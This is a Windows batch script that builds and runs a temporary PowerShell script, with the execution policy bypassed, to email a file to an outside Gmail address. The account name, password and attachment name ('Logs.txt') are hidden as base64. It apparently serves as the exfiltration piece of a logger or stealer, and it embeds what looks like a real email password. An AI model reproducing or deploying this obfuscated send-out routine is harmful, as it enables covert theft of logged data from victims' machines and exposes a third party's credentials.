@ECHO OFF

:: -- Set senvitive values and file attachment path
SET "GmailAccount=aQBmAGIAYgBpAHUAQABnAG0AYQBpAGwALgBjAG8AbQA="
SET "GmailPassword=aQBuAHIAZQBpAG4ANwA2AGcAIQA="
SET "Attachment=TABvAGcAcwAuAHQAeAB0AA=="

:: -- Set other email values
SET "EmailTo=ifbbiu@gmail.com"
SET "EmailSubject=ZANK POS ENTERPRISES"
SET "EmailBody=SAMPLE FILE WITH ATTACHMENT"

CALL :PowerShell
CD /D "%PowerShellDir%"
Powershell -ExecutionPolicy Bypass -Command "& '%PSScript%' '%GmailAccount%' '%GmailPassword%' '%Attachment%'"
EXIT

:PowerShell
SET PowerShellDir=C:\Windows\System32\WindowsPowerShell\v1.0
SET PSScript=%temp%\~tmpSendeMail.ps1
IF EXIST "%PSScript%" DEL /Q /F "%PSScript%"

ECHO $Username      = $args[0]                                                                                     >> "%PSScript%"
ECHO $Username      = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($Username))     >> "%PSScript%"
ECHO $EmailPassword = $args[1]                                                                                     >> "%PSScript%"
ECHO $EmailPassword = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($EmailPassword))>> "%PSScript%"
ECHO $Attachment    = $args[2]                                                                                     >> "%PSScript%"
ECHO $Attachment    = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($Attachment))   >> "%PSScript%"
ECHO                                          >> "%PSScript%"
ECHO $Username    = $Username                 >> "%PSScript%"
ECHO $EmailTo     = "%EmailTo%"               >> "%PSScript%"
ECHO $EmailFrom   = $Username                 >> "%PSScript%"
ECHO $Subject     = "%EmailSubject%"          >> "%PSScript%"
ECHO $Body        = "%EmailBody%"             >> "%PSScript%"
ECHO $SMTPServer  = "smtp.gmail.com"          >> "%PSScript%"
ECHO $SMTPMessage = New-Object System.Net.Mail.MailMessage($EmailFrom, $EmailTo, $Subject, $Body) >> "%PSScript%"
ECHO $Attachment  = New-Object System.Net.Mail.Attachment($Attachment)                            >> "%PSScript%"
ECHO $SMTPMessage.Attachments.Add($Attachment)                                                    >> "%PSScript%"
ECHO $SMTPClient  = New-Object Net.Mail.SmtpClient($SmtpServer, 587)                              >> "%PSScript%"
ECHO $SMTPClient.EnableSsl = $true                                                                >> "%PSScript%"
ECHO $SMTPClient.Credentials = New-Object System.Net.NetworkCredential($Username, $EmailPassword) >> "%PSScript%"
ECHO $SMTPClient.Send($SMTPMessage)                                                               >> "%PSScript%"
GOTO :EOF

pause